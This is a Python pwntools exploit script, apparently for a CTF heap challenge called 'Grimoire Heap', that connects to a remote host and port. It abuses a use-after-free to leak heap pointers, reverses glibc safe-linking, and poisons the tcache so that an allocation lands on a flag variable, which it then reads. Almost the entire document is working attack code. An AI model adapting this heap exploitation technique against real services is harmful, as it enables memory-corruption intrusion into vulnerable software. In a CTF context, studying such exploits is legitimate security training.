#!/usr/bin/env python3
"""
Grimoire Heap - Direct calculation approach
Use the UAF to leak addresses and compute g_flag location
"""
from pwn import *

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def edit(p, idx, size, data):
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    assert len(data) == size
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    data = p.recv(size)
    p.recv(1)
    return data

p = connect()
p.recvuntil(b'> ')
log.info("Connected")

# Strategy: Create 2 spells, banish both, use tcache poisoning
# The key is figuring out the right offset for g_flag

# Step 1: Create 2 spells
log.info("Creating 2 spells")
create(p, 0, 0x80, b'A' * 0x10 + b'\n')
create(p, 1, 0x80, b'B' * 0x10 + b'\n')

# Step 2: Banish both (tcache count = 2)
log.info("Banishing both")
banish(p, 0)
banish(p, 1)

# Step 3: Read UAF to get addresses
data1 = recite(p, 1, 0x80)  # tcache head
fd1 = u64(data1[0:8])
data0 = recite(p, 0, 0x80)
fd0 = u64(data0[0:8])

log.info(f"fd0 (spell0, freed first) = {hex(fd0)}")
log.info(f"fd1 (spell1, freed second) = {hex(fd1)}")

# spell0_addr = fd0 << 12
spell0_addr = fd0 << 12
log.info(f"spell0_addr = {hex(spell0_addr)}")

# spell1_addr: fd1 = (spell1_addr >> 12) ^ spell0_addr
# spell1_addr >> 12 = fd1 ^ spell0_addr
spell1_shifted = fd1 ^ spell0_addr
spell1_addr = spell1_shifted << 12
log.info(f"spell1_addr = {hex(spell1_addr)}")
log.info(f"diff spell1-spell0 = {hex(spell1_addr - spell0_addr)}")

# g_flag should be before spell0
# Try different offsets
for offset in [0x90, 0x330, 0x2a0, 0x320, 0x300, 0x100, 0x1000]:
    g_flag_candidate = spell0_addr - offset
    if g_flag_candidate > 0 and g_flag_candidate < (1 << 47):
        log.info(f"Trying offset {hex(offset)}: g_flag = {hex(g_flag_candidate)}")

# The actual offset depends on the heap layout
# Let's try offset 0x90 first (most common)
g_flag_addr = spell0_addr - 0x90
log.info(f"Using g_flag_addr = {hex(g_flag_addr)} (offset 0x90)")

# Step 4: Poison tcache
# spell1 is the head. We want next alloc to return g_flag.
# spell1->fd should be: (spell1_addr >> 12) ^ g_flag_addr
protected_g_flag = (spell1_addr >> 12) ^ g_flag_addr
log.info(f"protected_g_flag = {hex(protected_g_flag)}")

payload = p64(protected_g_flag) + b'\x00' * (0x80 - 8)
log.info("Poisoning tcache")
edit(p, 1, 0x80, payload)

# Step 5: Allocate - first returns spell1, second returns g_flag
log.info("Allocating spell 2 (returns spell1)")
create(p, 2, 0x80, b'C' * 0x10 + b'\n')

log.info("Allocating spell 3 (should return g_flag)")
create(p, 3, 0x80, b'\n')

# Step 6: Read spell 3
log.info("Reading spell 3")
data = recite(p, 3, 0x80)
log.info(f"data hex: {data[:64].hex()}")
try:
    text = data[:0x80].decode('latin-1')
    log.info(f"data text: {text[:200]}")
except:
    pass

p.sendline(b'0')
p.close()
